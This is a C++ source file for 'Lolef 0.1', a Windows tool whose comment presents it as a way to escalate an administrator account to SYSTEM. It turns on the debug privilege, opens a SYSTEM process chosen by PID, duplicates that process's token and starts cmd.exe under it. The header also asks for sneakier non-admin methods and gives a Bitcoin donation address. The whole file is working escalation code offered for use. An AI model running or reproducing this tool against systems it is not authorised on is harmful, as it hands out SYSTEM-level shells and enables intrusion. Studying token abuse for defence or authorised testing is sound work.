#include <windows.h>
#include <iostream>
#include <sstream>
#include <TlHelp32.h>

/*
Reading: https://raw.githubusercontent.com/hatRiot/token-priv/master/abusing_token_eop_1.0.txt
More:    https://stackoverflow.com/questions/39238086/running-process-in-system-context

Lolef 0.1 - Just another binary to PricEsc Admin Accounts to nt authority\system - LOL? F in the chat to pay respect.
If you wanna send me some digital monies to keep me developing cool stuff, mew? (Cat food iz expensive.)
If you know of sneakier ways to do this, maybe via a non-admin account please email me. PGP key is on my website. 

Bitcoin: bc1qywm3pcgtwv2wx42ue9zelepdgukp4t94krh0va

Tested on Windows 10 x64 Enterprise 22H2 (OS Build 19045.2728)

Changes made:
1. Indentation: The code is indented properly for better readability.
2. nullptr: Replaced `NULL` with `nullptr` for null pointers.
3. reinterpret_cast: Replaced C-style cast with `reinterpret_cast`.
4. Removed unnecessary comments: Removed comments that merely restated the code, since they don't add any value.
5. Formatting: Adjusted spacing between code blocks and lines for consistency.
*/

int main(int argc, char* argv[]) {
    // Check if process ID is provided
    if (argc < 2) {
        std::cout << "\n" << std::endl;
        std::cout << "\n" << std::endl;
        std::cout << " _._     _,-'\"\"`-._" << std::endl;
        std::cout << "(,-.`._,'(       |\\`-/|" << std::endl;
        std::cout << "    `-.-' \\ )-`( , o o)" << std::endl;
        std::cout << "          `-    \\`_`\"'-\n" << std::endl;
        std::cout << "           Meow." << std::endl;
        std::cout << "https://afflicted.sh/" << std::endl;
        std::cout << "Written by: _SiCk\n" << std::endl;
        std::cout << "Useage: lolef.exe [SYSTEMPID]" << std::endl;





        return 0;
    }

    // Get the process ID from the command line argument
    DWORD pid = 0;
    std::stringstream ss(argv[1]);
    ss >> pid;

    if (pid == 0) {
        std::cout << "Invalid process ID!" << std::endl;
        return 0;
    }

    // Enable debug privilege
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cout << "OpenProcessToken failed: " << GetLastError() << std::endl;
        return 0;
    }

    TOKEN_PRIVILEGES tk;
    tk.PrivilegeCount = 1;
    tk.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tk.Privileges[0].Luid)) {
        std::cout << "LookupPrivilegeValue failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 0;
    }

    if (!AdjustTokenPrivileges(hToken, FALSE, &tk, 0, nullptr, nullptr)) {
        std::cout << "AdjustTokenPrivileges failed: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 0;
    }

    CloseHandle(hToken);

    // Open the process
    HANDLE process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!process_handle) {
        std::cout << "Failed to open process: " << GetLastError() << std::endl;
        return 0;
    }

    // Get the process token
    HANDLE process_token = nullptr;
    if (!OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &process_token)) {
        std::cout << "Failed to open process token: " << GetLastError() << std::endl;
        CloseHandle(process_handle);
        return 0;
    }

    // Duplicate the process token
    HANDLE new_token = nullptr;
    if (!DuplicateTokenEx(process_token, MAXIMUM_ALLOWED, nullptr, SecurityImpersonation, TokenPrimary, &new_token)) {
        std::cout << "Failed to duplicate token: " << GetLastError() << std::endl;
        CloseHandle(process_token);
        CloseHandle(process_handle);
        return 0;
    }

    // Start the command prompt with the new token
    STARTUPINFOEX siex = { 0 };
    siex.StartupInfo.cb = sizeof(STARTUPINFOEX);
    LPWSTR szCmdline = _wcsdup(TEXT("cmd.exe"));
    PROCESS_INFORMATION pi = { 0 };
    if (!CreateProcessWithTokenW(new_token, LOGON_WITH_PROFILE, nullptr, szCmdline, CREATE_NEW_CONSOLE, nullptr, nullptr, reinterpret_cast<LPSTARTUPINFOW>(&siex), &pi)) {
        std::cout << "CreateProcessWithTokenW failed: " << GetLastError() << std::endl;
        CloseHandle(new_token);
        CloseHandle(process_token);
        CloseHandle(process_handle);
        free(szCmdline);
        return 0;
    }

    // Clean up
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(new_token);
    CloseHandle(process_token);
    CloseHandle(process_handle);
    free(szCmdline);
    return 0;
}
